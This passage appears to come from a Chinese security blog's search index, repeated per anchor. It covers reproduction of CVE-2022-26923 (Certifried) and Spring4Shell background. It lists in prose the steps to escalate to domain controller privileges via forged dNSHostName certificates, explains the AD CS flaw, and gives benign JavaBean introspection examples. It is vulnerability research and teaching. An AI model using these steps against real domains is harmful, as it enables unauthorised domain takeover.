通过证书进行认证，获取域控的 NT hash 值 再利用 NT hash 值读取账号信息 获取域控权限 ","date":"2022-06-02","objectID":"/2022/06/cve-202226923-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/:2:2","series":[],"tags":[],"title":"CVE 2022–26923 漏洞复现及分析","uri":"/2022/06/cve-202226923-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/#修改-dnshostname"},{"categories":[],"content":"\r复现过程\r利用 impacket 根据现有账户创建机器账号 修改 servicePrincipalName 修改 DNSHostName 通过 certipy 工具申请证书 通过证书进行认证，获取域控的 NT hash 值 再利用 NT hash 值读取账号信息 获取域控权限 ","date":"2022-06-02","objectID":"/2022/06/cve-202226923-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/:2:2","series":[],"tags":[],"title":"CVE 2022–26923 漏洞复现及分析","uri":"/2022/06/cve-202226923-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/#通过-certipy-工具申请证书"},{"categories":[],"content":"\r复现过程\r利用 impacket 根据现有账户创建机器账号 修改 servicePrincipalName 修改 DNSHostName 通过 certipy 工具申请证书 通过证书进行认证，获取域控的 NT hash 值 再利用 NT hash 值读取账号信息 获取域控权限 ","date":"2022-06-02","objectID":"/2022/06/cve-202226923-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/:2:2","series":[],"tags":[],"title":"CVE 2022–26923 漏洞复现及分析","uri":"/2022/06/cve-202226923-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/#通过证书进行认证获取域控的-nt-hash-值"},{"categories":[],"content":"\r复现过程\r利用 impacket 根据现有账户创建机器账号 修改 servicePrincipalName 修改 DNSHostName 通过 certipy 工具申请证书 通过证书进行认证，获取域控的 NT hash 值 再利用 NT hash 值读取账号信息 获取域控权限 ","date":"2022-06-02","objectID":"/2022/06/cve-202226923-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/:2:2","series":[],"tags":[],"title":"CVE 2022–26923 漏洞复现及分析","uri":"/2022/06/cve-202226923-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/#再利用-nt-hash-值读取账号信息"},{"categories":[],"content":"\r复现过程\r利用 impacket 根据现有账户创建机器账号 修改 servicePrincipalName 修改 DNSHostName 通过 certipy 工具申请证书 通过证书进行认证，获取域控的 NT hash 值 再利用 NT hash 值读取账号信息 获取域控权限 ","date":"2022-06-02","objectID":"/2022/06/cve-202226923-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/:2:2","series":[],"tags":[],"title":"CVE 2022–26923 漏洞复现及分析","uri":"/2022/06/cve-202226923-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/#获取域控权限"},{"categories":[],"content":"\r漏洞分析","date":"2022-06-02","objectID":"/2022/06/cve-202226923-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/:3:0","series":[],"tags":[],"title":"CVE 2022–26923 漏洞复现及分析","uri":"/2022/06/cve-202226923-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/#漏洞分析"},{"categories":[],"content":"\rActive Directory证书服务Active Directory证书服务简称AD CS，是一种域内认证服务，是公钥基础设施PKI的一个实现，通过发行证书提供了文件加密、数字签名、身份验证等功能。其中，证书颁发机构（CA）负责颁发证书。 证书中包含的信息将身份（主体）绑定到公钥/私钥对。然后，应用程序可以在操作中使用密钥对作为用户身份的证明。证书颁发机构 (CA) 负责颁发证书。 证书申请流程大致过程： 客户端创建公钥/私钥对； 将公钥与其他信息 (如证书的主题和证书模板名称) 一起放在证书签名请求 (CSR) 消息中，并使用私钥签署； CA 首先判断用户是否允许进行证书申请，证书模板是否存在以及判断请求内容是否符合证书模板； 通过审核后，CA 生成含有客户端公钥的证书并使用自己的私钥来签署； 签署完的证书可以进行查看并使用。 ","date":"2022-06-02","objectID":"/2022/06/cve-202226923-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/:3:1","series":[],"tags":[],"title":"CVE 2022–26923 漏洞复现及分析","uri":"/2022/06/cve-202226923-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/#active-directory证书服务"},{"categories":[],"content":"\r证书模板默认情况下，域用户可以注册User证书模板，域计算机可以注册Machine证书模板。两个证书模板都允许客户端身份验证。这意味着颁发的证书可以通过PKINIT Kerberos扩展用于针对KDC的身份验证。 两者的主要区别在于申请者身份证明使用的属性不同，User证书模板的身份证明使用用户主体名称(User Principal Name, UPN)，而基于Machine证书模板的机器账户将使用dNSHostName属性作为证明。 ","date":"2022-06-02","objectID":"/2022/06/cve-202226923-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/:3:2","series":[],"tags":[],"title":"CVE 2022–26923 漏洞复现及分析","uri":"/2022/06/cve-202226923-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/#证书模板"},{"categories":[],"content":"\r用户账户的证书申请 | UPN用户账户根据模板申请证书时，用户账户的UPN将被嵌入到证书中进行识别。当我们使用该证书进行认证时，KDC会尝试将证书中的UPN映射到用户身上。 User证书模板的msPKI-Certificate-Name-Flag属性存在一个CT_FLAG_SUBJECT_ALT_REQUIRE_UPN标志位，用于指示UPN标志 根据MS-ADTS (3.1.1.5.1.3 Uniqueness Constraints)，UPN必须具有唯一性。假如我们将win10@winsrv19.com更改成test1@winsrv19.com，系统会提示约束冲突错误，因为test1@winsrv19.com已经被test1使用了。 ","date":"2022-06-02","objectID":"/2022/06/cve-202226923-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/:3:3","series":[],"tags":[],"title":"CVE 2022–26923 漏洞复现及分析","uri":"/2022/06/cve-202226923-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/#用户账户的证书申请--upn"},{"categories":[],"content":"\r机器账户的证书申请 | dNSHostName基于Machine证书模板的机器账户进行证书申请时需要借助dNSHostName属性进行验证。CA下发的证书中会嵌入计算机的DNS属性。 dNSHostName不同于userPrincipalName，其并不需要确保唯一性，因为在MS-ADTS (3.1.1.5.1.3 Uniqueness Constraints)中只提到了UPN和SPN的唯一性。 在证书模板的msPKI-Certificate-Name-Flag属性还存在一个CT_FLAG_SUBJECT_ALT_REQUIRE_DNS标志位，其指示CA将从Active Directory中请求者用户对象的DNS属性获得的值添加到已颁发证书的主题备用名称中。 ","date":"2022-06-02","objectID":"/2022/06/cve-202226923-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/:3:4","series":[],"tags":[],"title":"CVE 2022–26923 漏洞复现及分析","uri":"/2022/06/cve-202226923-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/#机器账户的证书申请--dnshostname"},{"categories":[],"content":"\r域控SPN唯一性通过上面的分析，漏洞点就呼之欲出了：可以通过修改dNSHostName来伪造高权限用户，直接尝试修改dNSHostName测试下。 将dre4merpc$机器账户的dNSHostName更改为win10.winsrv19.com，并没有出现不允许操作，而是出现如下错误： 原因是SPN的唯一性，当我们试图将dre4merpc$机器账户的dNSHostName属性更新为win10.winsrv19.com时，域控制器试图更新SPN属性，该属性将被更新为包括RestrictedKrbHost/Win10.winsrv19.com和HOST/Win10.winsrv19.com，这将与域控制器的SPN属性冲突。 因此，通过更新dre4merpc$机器账户的dNSHostName属性，当域控制器也试图更新dre4merpc$机器账户的SPN时，我们间接地造成了约束性违反。 我们注意到，当我们更新dNSHostName时，只有两个值被更新和检查，即RestrictedKrbHost/dre4merpc.winsrv19.com和HOST/dre4merpc.winsrv19.com，其中包含dNSHostName属性值，解决措施就是删除dre4merpc$机器账户中这两个SPN值，在域控同步更新时不造成冲突 此时，我们使用dre4merpc$机器账户申请证书时，颁发的证书中将会包含填充篡改后的dNSHostName，即win10.winsrv19.com。dre4merpc$机器账户申请的证书就具备域控的身份了。 ","date":"2022-06-02","objectID":"/2022/06/cve-202226923-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/:3:5","series":[],"tags":[],"title":"CVE 2022–26923 漏洞复现及分析","uri":"/2022/06/cve-202226923-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/#域控spn唯一性"},{"categories":[],"content":"\r参考文献https://mp.weixin.qq.com/s/yMTnM9mtisCgN-z2KunTNQ https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4 http://noahblog.360.cn/active-directory-certificate-services-attack-and-exploit/ ","date":"2022-06-02","objectID":"/2022/06/cve-202226923-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/:4:0","series":[],"tags":[],"title":"CVE 2022–26923 漏洞复现及分析","uri":"/2022/06/cve-202226923-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/#参考文献"},{"categories":[],"content":"\r背景2022 年 3 月 31 日，Spring Framework for Java 中的漏洞被公开披露，现已被给予编号 CVE-2022-22965。 Spring 框架是 Java 中使用最广泛的轻量级开源框架。在 Java Development Kit (JDK) 9.0 或更高版本中，远程攻击者可以通过框架的参数绑定特性获取 AccessLogValve 对象，并使用恶意字段值触发管道机制，并在某些条件下写入任意路径的文件。该漏洞现已被修补。 spring 官方公告： https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement ","date":"2022-05-31","objectID":"/2022/05/spring4shell-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/:1:0","series":[],"tags":[],"title":"Spring4Shell 漏洞复现及分析","uri":"/2022/05/spring4shell-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/#背景"},{"categories":[],"content":"\r前置知识 JavaBean JavaBean 内省 Spring CachedIntrospectionResults spring 参数绑定 ","date":"2022-05-31","objectID":"/2022/05/spring4shell-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/:2:0","series":[],"tags":[],"title":"Spring4Shell 漏洞复现及分析","uri":"/2022/05/spring4shell-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/#前置知识"},{"categories":[],"content":"\rJavaBeanJavaBean 本质上就是一个 Java 类，但是其是一种特殊的、可重用的类。 其是符合一定规范编写的 Java 类，不是一种技术，而是一种规范。大家针对这种规范，总结了很多开发技巧、工具函数。符合这种规范的类，可以被重用。 编写 JavaBean 必须满足以下几点要求： 这个类必须具有一个公共的 (public) 无参构造函数； 所有属性私有化 (private)； 私有化的属性必须通过 public 类型的方法 (getter 和 setter) 暴露给其他程序，并且方法的命名也必须遵循一定的命名规范。 这个类应是可序列化的。（比如可以实现 Serializable 接口，用于实现 bean 的持久性） java package player; public class PersonBean implements java.io.Serializable { // name 属性 private String name = null; // deceased 属性 private boolean deceased = false; // 无参构造函数 public PersonBean() { } //name 的 getter 方法 public String getName() { return name; } //name 的 setter 方法 public void setName(final String value) { name = value; } // deceased 的 getter 方法 // boolean 类型的特殊 getter public boolean isDeceased() { return deceased; } // deceased 的 setter 方法 public void setDeceased(final boolean value) { deceased = value; } }\r","date":"2022-05-31","objectID":"/2022/05/spring4shell-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/:2:1","series":[],"tags":[],"title":"Spring4Shell 漏洞复现及分析","uri":"/2022/05/spring4shell-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/#javabean"},{"categories":[],"content":"\rJavaBean 内省\r基本概念内省 (IntroSpector): 计算机程序在运行时 (Runtime) 检查对象 (Object) 类型的一种能力，通常也可以称作运行时类型检查 Java 官方对 JavaBean 内省的定义 At runtime and in the builder environment we need to be able to figure out which properties, events, and methods a Java Bean supports. We call this process introspection. 从 Java Bean 的角度来看，这里的对象就是 Bean 对象，主要关注点是属性、方法和事件等，也就是说在运行时可以获取相应的信息进行一些处理，这就是 JavaBean 的内省机制。 上述描述和反射很接近，反射是获取一个对象所属的类，并通过 Class 调用类内的属性和方法，和内省机制很接近。 和反射的区别首先明确，内省其实就是对反射的封装 By default we will use a low level reflection mechanism to study the methods supported by a target bean and then apply simple design patterns to deduce from those methods what properties, events, and public methods are supported. 反射：在运行状态把 Java 类中的各种成分映射成相应的 Java 类 (Method, Class 等），可以动态的获取所有的属性以及动态调用任意一个方法，强调的是运行状态 内省：Java 语言针对 Bean 类属性、事件的一种缺省处理方法，并且内省机制是通过反射来实现的。返回的 BeanInfo 用来暴露一个 Bean 的属性、方法和事件，以后我们就可以操纵该 JavaBean 的属性 源码分析详解\rPropertyDescriptor属性描述符，该类实现了对 JavaBean 的某一属性的所有描述 主要方法包括： getPropertyType()，获得属性的 Class 对象； getReadMethod()，获得用于读取属性值的方法； getWriteMethod()，获得用于写入属性值的方法； hashCode()，获取对象的哈希值； setReadMethod(Method readMethod)，设置用于读取属性值的方法； setWriteMethod(Method writeMethod)，设置用于写入属性值的方法。 java public class User { private String name; public String getName() { return name; } public void setName(String name) { this.name = name; } @Override public String toString() { return \"User{\" + \"name='\" + name + '\\'' + '}'; } } public static void main (String[] args) throws Exception { // 创建并输出 User 对象的值 User user = new User(); System.out.println( user.toString ); // 创建一个 User.name 的属性描述符 PropertyDescriptor propertyDescriptor = new PropertyDescriptor( \"name\", User.class ); // 获得并调用 User.name 的读方法，也就是 getter --\u003e User.getname() Method readMethod = propertyDescriptor.getReadMethod(); System.out.println( readMethod.invoke( user ) ); // 获得并调用 User.name 的写方法，也就是 setter --\u003e User.setname() Method writeMethod = propertyDescriptor.getWriteMethod(); writeMethod.invoke( user, \"hello\" ); System.out.println( user.toString ); }\rtext 输出结果： User{name='null', aName='null'} null User{name='hello', aName='null'}\r通过上述的例子，可以看出 PropertyDescriptor, 就是对属性反射的一种封装，方便操作对应 JavaBean 的属性，使用 PropertyDescriptor 其实就是利用反射对其 get 和 set 方法的操作而已。 BeanInfoBeanInfo 是一个接口，其常用的实现是 GenericBeanInfo java class GenericBeanInfo extends SimpleBeanInfo { // JavaBean 的描述符，持有类 Class 对象的引用 private BeanDescriptor beanDescriptor; // JavaBean 的所有属性描述符 private PropertyDescriptor[] properties; // JavaBean 的所有方法描述符 private MethodDescriptor[] methods; ... }\rBeanInfo 就是对一个 JavaBean 类所有的属性、方法等反射操作封装后的集合体。 IntroSpector介绍完了内省所需要的所有前置知识，最后说回最开始的内省机制。 Java 中提供了一套 API 用来访问某个属性的 getter/setter 方法。 Introspector, 提供了 getBeanInfo 方法，可以拿到一个 JavaBean 的所有信息 BeanInfo, 提供了 getPropertyDescriptors 方法和 getMethodDescriptors 方法可以拿到 javaBean 的字段信息列表和 getter 和 setter 方法信息列表 PropertyDescriptors 可以根据字段直接获得该字段的 getter 和 setter 方法 MethodDescriptors 可以获得方法的元信息，比如方法名，参数个数，参数字段类型等 通过 Introspector 获取一个类的 BeanInfo, 通过 BeanInfo 能够获取属性描述器、方法描述器、类 Class 对象，利用获取到的属性描述器，我们能够往一个该类实例中放入数据 java public static void main(String[] args) throws Exception { BeanInfo beanInfo = Introspector.getBeanInfo( Customer.class ); PropertyDescriptor[] propertyDescriptors = beanInfo.getPropertyDescriptors(); MethodDescriptor[] methodDescriptors = beanInfo.getMethodDescriptors(); BeanDescriptor beanDescriptor = beanInfo.getBeanDescriptor(); }\r","date":"2022-05-31","objectID":"/2022/05/spring4shell-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/:2:2","series":[],"tags":[],"title":"Spring4Shell 漏洞复现及分析","uri":"/2022/05/spring4shell-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/#javabean-内省"},{"categories":[],"content":"\rJavaBean 内省\r基本概念内省 (IntroSpector): 计算机程序在运行时 (Runtime) 检查对象 (Object) 类型的一种能力，通常也可以称作运行时类型检查 Java 官方对 JavaBean 内省的定义 At runtime and in the builder environment we need to be able to figure out which properties, events, and methods a Java Bean supports. We call this process introspection. 从 Java Bean 的角度来看，这里的对象就是 Bean 对象，主要关注点是属性、方法和事件等，也就是说在运行时可以获取相应的信息进行一些处理，这就是 JavaBean 的内省机制。 上述描述和反射很接近，反射是获取一个对象所属的类，并通过 Class 调用类内的属性和方法，和内省机制很接近。 和反射的区别首先明确，内省其实就是对反射的封装 By default we will use a low level reflection mechanism to study the methods supported by a target bean and then apply simple design patterns to deduce from those methods what properties, events, and public methods are supported. 反射：在运行状态把 Java 类中的各种成分映射成相应的 Java 类 (Method, Class 等），可以动态的获取所有的属性以及动态调用任意一个方法，强调的是运行状态 内省：Java 语言针对 Bean 类属性、事件的一种缺省处理方法，并且内省机制是通过反射来实现的。返回的 BeanInfo 用来暴露一个 Bean 的属性、方法和事件，以后我们就可以操纵该 JavaBean 的属性 源码分析详解\rPropertyDescriptor属性描述符，该类实现了对 JavaBean 的某一属性的所有描述 主要方法包括： getPropertyType()，获得属性的 Class 对象； getReadMethod()，获得用于读取属性值的方法； getWriteMethod()，获得用于写入属性值的方法； hashCode()，获取对象的哈希值； setReadMethod(Method readMethod)，设置用于读取属性值的方法； setWriteMethod(Method writeMethod)，设置用于写入属性值的方法。 java public class User { private String name; public String getName() { return name; } public void setName(String name) { this.name = name; } @Override public String toString() { return \"User{\" + \"name='\" + name + '\\'' + '}'; } } public static void main (String[] args) throws Exception { // 创建并输出 User 对象的值 User user = new User(); System.out.println( user.toString ); // 创建一个 User.name 的属性描述符 PropertyDescriptor propertyDescriptor = new PropertyDescriptor( \"name\", User.class ); // 获得并调用 User.name 的读方法，也就是 getter --\u003e User.getname() Method readMethod = propertyDescriptor.getReadMethod(); System.out.println( readMethod.invoke( user ) ); // 获得并调用 User.name 的写方法，也就是 setter --\u003e User.setname() Method writeMethod = propertyDescriptor.getWriteMethod(); writeMethod.invoke( user, \"hello\" ); System.out.println( user.toString ); }\rtext 输出结果： User{name='null', aName='null'} null User{name='hello', aName='null'}\r通过上述的例子，可以看出 PropertyDescriptor, 就是对属性反射的一种封装，方便操作对应 JavaBean 的属性，使用 PropertyDescriptor 其实就是利用反射对其 get 和 set 方法的操作而已。 BeanInfoBeanInfo 是一个接口，其常用的实现是 GenericBeanInfo java class GenericBeanInfo extends SimpleBeanInfo { // JavaBean 的描述符，持有类 Class 对象的引用 private BeanDescriptor beanDescriptor; // JavaBean 的所有属性描述符 private PropertyDescriptor[] properties; // JavaBean 的所有方法描述符 private MethodDescriptor[] methods; ... }\rBeanInfo 就是对一个 JavaBean 类所有的属性、方法等反射操作封装后的集合体。 IntroSpector介绍完了内省所需要的所有前置知识，最后说回最开始的内省机制。 Java 中提供了一套 API 用来访问某个属性的 getter/setter 方法。 Introspector, 提供了 getBeanInfo 方法，可以拿到一个 JavaBean 的所有信息 BeanInfo, 提供了 getPropertyDescriptors 方法和 getMethodDescriptors 方法可以拿到 javaBean 的字段信息列表和 getter 和 setter 方法信息列表 PropertyDescriptors 可以根据字段直接获得该字段的 getter 和 setter 方法 MethodDescriptors 可以获得方法的元信息，比如方法名，参数个数，参数字段类型等 通过 Introspector 获取一个类的 BeanInfo, 通过 BeanInfo 能够获取属性描述器、方法描述器、类 Class 对象，利用获取到的属性描述器，我们能够往一个该类实例中放入数据 java public static void main(String[] args) throws Exception { BeanInfo beanInfo = Introspector.getBeanInfo( Customer.class ); PropertyDescriptor[] propertyDescriptors = beanInfo.getPropertyDescriptors(); MethodDescriptor[] methodDescriptors = beanInfo.getMethodDescriptors(); BeanDescriptor beanDescriptor = beanInfo.getBeanDescriptor(); }\r","date":"2022-05-31","objectID":"/2022/05/spring4shell-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/:2:2","series":[],"tags":[],"title":"Spring4Shell 漏洞复现及分析","uri":"/2022/05/spring4shell-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/#基本概念"},{"categories":[],"content":"\rJavaBean 内省\r基本概念内省 (IntroSpector): 计算机程序在运行时 (Runtime) 检查对象 (Object) 类型的一种能力，通常也可以称作运行时类型检查 Java 官方对 JavaBean 内省的定义 At runtime and in the builder environment we need to be able to figure out which properties, events, and methods a Java Bean supports. We call this process introspection. 从 Java Bean 的角度来看，这里的对象就是 Bean 对象，主要关注点是属性、方法和事件等，也就是说在运行时可以获取相应的信息进行一些处理，这就是 JavaBean 的内省机制。 上述描述和反射很接近，反射是获取一个对象所属的类，并通过 Class 调用类内的属性和方法，和内省机制很接近。 和反射的区别首先明确，内省其实就是对反射的封装 By default we will use a low level reflection mechanism to study the methods supported by a target bean and then apply simple design patterns to deduce from those methods what properties, events, and public methods are supported. 反射：在运行状态把 Java 类中的各种成分映射成相应的 Java 类 (Method, Class 等），可以动态的获取所有的属性以及动态调用任意一个方法，强调的是运行状态 内省：Java 语言针对 Bean 类属性、事件的一种缺省处理方法，并且内省机制是通过反射来实现的。返回的 BeanInfo 用来暴露一个 Bean 的属性、方法和事件，以后我们就可以操纵该 JavaBean 的属性 源码分析详解\rPropertyDescriptor属性描述符，该类实现了对 JavaBean 的某一属性的所有描述 主要方法包括： getPropertyType()，获得属性的 Class 对象； getReadMethod()，获得用于读取属性值的方法； getWriteMethod()，获得用于写入属性值的方法； hashCode()，获取对象的哈希值； setReadMethod(Method readMethod)，设置用于读取属性值的方法； setWriteMethod(Method writeMethod)，设置用于写入属性值的方法。 java public class User { private String name; public String getName() { return name; } public void setName(String name) { this.name = name; } @Override public String toString() { return \"User{\" + \"name='\" + name + '\\'' + '}'; } } public static void main (String[] args) throws Exception { // 创建并输出 User 对象的值 User user = new User(); System.out.println( user.toString ); // 创建一个 User.name 的属性描述符 PropertyDescriptor propertyDescriptor = new PropertyDescriptor( \"name\", User.class ); // 获得并调用 User.name 的读方法，也就是 getter --\u003e User.getname() Method readMethod = propertyDescriptor.getReadMethod(); System.out.println( readMethod.invoke( user ) ); // 获得并调用 User.name 的写方法，也就是 setter --\u003e User.setname() Method writeMethod = propertyDescriptor.getWriteMethod(); writeMethod.invoke( user, \"hello\" ); System.out.println( user.toString ); }\rtext 输出结果： User{name='null', aName='null'} null User{name='hello', aName='null'}\r通过上述的例子，可以看出 PropertyDescriptor, 就是对属性反射的一种封装，方便操作对应 JavaBean 的属性，使用 PropertyDescriptor 其实就是利用反射对其 get 和 set 方法的操作而已。 BeanInfoBeanInfo 是一个接口，其常用的实现是 GenericBeanInfo java class GenericBeanInfo extends SimpleBeanInfo { // JavaBean 的描述符，持有类 Class 对象的引用 private BeanDescriptor beanDescriptor; // JavaBean 的所有属性描述符 private PropertyDescriptor[] properties; // JavaBean 的所有方法描述符 private MethodDescriptor[] methods; ... }\rBeanInfo 就是对一个 JavaBean 类所有的属性、方法等反射操作封装后的集合体。 IntroSpector介绍完了内省所需要的所有前置知识，最后说回最开始的内省机制。 Java 中提供了一套 API 用来访问某个属性的 getter/setter 方法。 Introspector, 提供了 getBeanInfo 方法，可以拿到一个 JavaBean 的所有信息 BeanInfo, 提供了 getPropertyDescriptors 方法和 getMethodDescriptors 方法可以拿到 javaBean 的字段信息列表和 getter 和 setter 方法信息列表 PropertyDescriptors 可以根据字段直接获得该字段的 getter 和 setter 方法 MethodDescriptors 可以获得方法的元信息，比如方法名，参数个数，参数字段类型等 通过 Introspector 获取一个类的 BeanInfo, 通过 BeanInfo 能够获取属性描述器、方法描述器、类 Class 对象，利用获取到的属性描述器，我们能够往一个该类实例中放入数据 java public static void main(String[] args) throws Exception { BeanInfo beanInfo = Introspector.getBeanInfo( Customer.class ); PropertyDescriptor[] propertyDescriptors = beanInfo.getPropertyDescriptors(); MethodDescriptor[] methodDescriptors = beanInfo.getMethodDescriptors(); BeanDescriptor beanDescriptor = beanInfo.getBeanDescriptor(); }\r","date":"2022-05-31","objectID":"/2022/05/spring4shell-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/:2:2","series":[],"tags":[],"title":"Spring4Shell 漏洞复现及分析","uri":"/2022/05/spring4shell-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/#和反射的区别"},{"categories":[],"content":"\rJavaBean 内省\r基本概念内省 (IntroSpector): 计算机程序在运行时 (Runtime) 检查对象 (Object) 类型的一种能力，通常也可以称作运行时类型检查 Java 官方对 JavaBean 内省的定义 At runtime and in the builder environment we need to be able to figure out which properties, events, and methods a Java Bean supports. We call this process introspection. 从 Java Bean 的角度来看，这里的对象就是 Bean 对象，主要关注点是属性、方法和事件等，也就是说在运行时可以获取相应的信息进行一些处理，这就是 JavaBean 的内省机制。 上述描述和反射很接近，反射是获取一个对象所属的类，并通过 Class 调用类内的属性和方法，和内省机制很接近。 和反射的区别首先明确，内省其实就是对反射的封装 By default we will use a low level reflection mechanism to study the methods supported by a target bean and then apply simple design patterns to deduce from those methods what properties, events, and public methods are supported. 反射：在运行状态把 Java 类中的各种成分映射成相应的 Java 类 (Method, Class 等），可以动态的获取所有的属性以及动态调用任意一个方法，强调的是运行状态 内省：Java 语言针对 Bean 类属性、事件的一种缺省处理方法，并且内省机制是通过反射来实现的。返回的 BeanInfo 用来暴露一个 Bean 的属性、方法和事件，以后我们就可以操纵该 JavaBean 的属性 源码分析详解\rPropertyDescriptor属性描述符，该类实现了对 JavaBean 的某一属性的所有描述 主要方法包括： getPropertyType()，获得属性的 Class 对象； getReadMethod()，获得用于读取属性值的方法； getWriteMethod()，获得用于写入属性值的方法； hashCode()，获取对象的哈希值； setReadMethod(Method readMethod)，设置用于读取属性值的方法； setWriteMethod(Method writeMethod)，设置用于写入属性值的方法。 java public class User { private String name; public String getName() { return name; } public void setName(String name) { this.name = name; } @Override public String toString() { return \"User{\" + \"name='\" + name + '\\'' + '}'; } } public static void main (String[] args) throws Exception { // 创建并输出 User 对象的值 User user = new User(); System.out.println( user.toString ); // 创建一个 User.name 的属性描述符 PropertyDescriptor propertyDescriptor = new PropertyDescriptor( \"name\", User.class ); // 获得并调用 User.name 的读方法，也就是 getter --\u003e User.getname() Method readMethod = propertyDescriptor.getReadMethod(); System.out.println( readMethod.invoke( user ) ); // 获得并调用 User.name 的写方法，也就是 setter --\u003e User.setname() Method writeMethod = propertyDescriptor.getWriteMethod(); writeMethod.invoke( user, \"hello\" ); System.out.println( user.toString ); }\rtext 输出结果： User{name='null', aName='null'} null User{name='hello', aName='null'}\r通过上述的例子，可以看出 PropertyDescriptor, 就是对属性反射的一种封装，方便操作对应 JavaBean 的属性，使用 PropertyDescriptor 其实就是利用反射对其 get 和 set 方法的操作而已。 BeanInfoBeanInfo 是一个接口，其常用的实现是 GenericBeanInfo java class GenericBeanInfo extends SimpleBeanInfo { // JavaBean 的描述符，持有类 Class 对象的引用 private BeanDescriptor beanDescriptor; // JavaBean 的所有属性描述符 private PropertyDescriptor[] properties; // JavaBean 的所有方法描述符 private MethodDescriptor[] methods; ... }\rBeanInfo 就是对一个 JavaBean 类所有的属性、方法等反射操作封装后的集合体。 IntroSpector介绍完了内省所需要的所有前置知识，最后说回最开始的内省机制。 Java 中提供了一套 API 用来访问某个属性的 getter/setter 方法。 Introspector, 提供了 getBeanInfo 方法，可以拿到一个 JavaBean 的所有信息 BeanInfo, 提供了 getPropertyDescriptors 方法和 getMethodDescriptors 方法可以拿到 javaBean 的字段信息列表和 getter 和 setter 方法信息列表 PropertyDescriptors 可以根据字段直接获得该字段的 getter 和 setter 方法 MethodDescriptors 可以获得方法的元信息，比如方法名，参数个数，参数字段类型等 通过 Introspector 获取一个类的 BeanInfo, 通过 BeanInfo 能够获取属性描述器、方法描述器、类 Class 对象，利用获取到的属性描述器，我们能够往一个该类实例中放入数据 java public static void main(String[] args) throws Exception { BeanInfo beanInfo = Introspector.getBeanInfo( Customer.class ); PropertyDescriptor[] propertyDescriptors = beanInfo.getPropertyDescriptors(); MethodDescriptor[] methodDescriptors = beanInfo.getMethodDescriptors(); BeanDescriptor beanDescriptor = beanInfo.getBeanDescriptor(); }\r","date":"2022-05-31","objectID":"/2022/05/spring4shell-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/:2:2","series":[],"tags":[],"title":"Spring4Shell 